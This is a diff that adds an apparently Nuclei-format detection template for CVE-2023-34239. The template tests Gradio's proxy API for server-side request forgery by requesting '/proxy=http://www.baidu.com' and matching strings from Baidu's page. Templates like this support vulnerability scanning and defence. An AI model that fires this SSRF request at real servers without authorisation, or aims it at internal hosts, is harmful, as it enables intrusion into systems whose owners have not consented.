@@ -1,0 +1,25 @@
+id: cve-2023-34239
+info:
+  name: Gradio Proxy API SSRF (CVE-2023-34239)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,cve-2023-34239
+  description: |
+    The Gradio proxy API is vulnerable to SSRF, allowing an attacker to make server-side requests to arbitrary domains.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy=http://www.baidu.com"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "百度热搜"
+      - type: word
+        part: body
+        words:
+          - "百度一下，你就知道"
